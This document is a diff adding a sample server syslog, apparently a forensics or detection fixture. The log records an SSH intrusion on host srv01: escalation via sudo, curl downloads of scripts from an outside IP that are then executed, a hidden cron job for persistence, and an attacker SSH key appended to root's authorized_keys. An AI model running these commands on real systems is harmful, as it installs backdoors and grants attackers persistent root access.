@@ -1,0 +1,24 @@
+Feb 19 01:48:03 srv01 systemd[1]: Starting Daily apt upgrade and clean activities...
+Feb 19 01:48:05 srv01 systemd[1]: Started Daily apt upgrade and clean activities.
+Feb 19 01:52:10 srv01 systemd-logind[712]: New session 42 of user svc_backup.
+Feb 19 01:55:32 srv01 systemd-logind[712]: Session 42 logged out. Waiting for processes to exit.
+Feb 19 02:03:10 srv01 sshd[3000]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.100.87.12  user=unknown
+Feb 19 02:10:23 srv01 sshd[3600]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.100.87.12  user=svc_backup
+Feb 19 02:14:07 srv01 systemd-logind[712]: New session 43 of user svc_backup.
+Feb 19 02:14:44 srv01 bash[3921]: svc_backup@srw01:~$ whoami
+Feb 19 02:14:45 srv01 bash[3921]: svc_backup@srw01:~$ id
+Feb 19 02:15:11 srv01 bash[3921]: svc_backup@srw01:~$ sudo -l
+Feb 19 02:15:32 srv01 bash[3921]: svc_backup@srw01:~$ sudo bash
+Feb 19 02:16:04 srv01 bash[4012]: root@srw01:/root# mkdir -p /usr/local/bin/.sys
+Feb 19 02:16:21 srv01 bash[4012]: root@srw01:/root# curl -fsSL http://198.51.100.23/.cache/patch.sh -o /tmp/.upd
+Feb 19 02:16:22 srv01 bash[4012]: root@srw01:/root# chmod +x /tmp/.upd && /tmp/.upd --install
+Feb 19 02:17:02 srv01 bash[4012]: root@srw01:/root# curl -fsSL http://198.51.100.23/.cache/rotate.sh -o /usr/local/bin/.sys/update.sh
+Feb 19 02:17:03 srv01 bash[4012]: root@srw01:/root# chmod 700 /usr/local/bin/.sys/update.sh
+Feb 19 02:18:49 srv01 bash[4012]: root@srw01:/root# printf '*/15 * * * * root /bin/bash /usr/local/bin/.sys/update.sh --silent\n' | tee /etc/cron.d/.sys-update
+Feb 19 02:19:00 srv01 CRON[4128]: (root) CMD (/bin/bash /usr/local/bin/.sys/update.sh --silent)
+Feb 19 02:19:01 srv01 systemd[1]: Started Session 44 of user root.
+Feb 19 02:19:01 srv01 bash[4130]: root@srw01:/root# echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDVt7x4n... attacker@relay' >> /root/.ssh/authorized_keys
+Feb 19 02:19:02 srv01 bash[4130]: root@srw01:/root# touch /var/tmp/.cache/.ok
+Feb 19 02:20:58 srv01 systemd[1]: Stopping Session 44 of user root.
+Feb 19 02:21:09 srv01 systemd-logind[712]: Session 43 logged out. Waiting for processes to exit.
+Feb 19 02:23:13 srv01 systemd[1]: Started Cleanup of Temporary Directories.
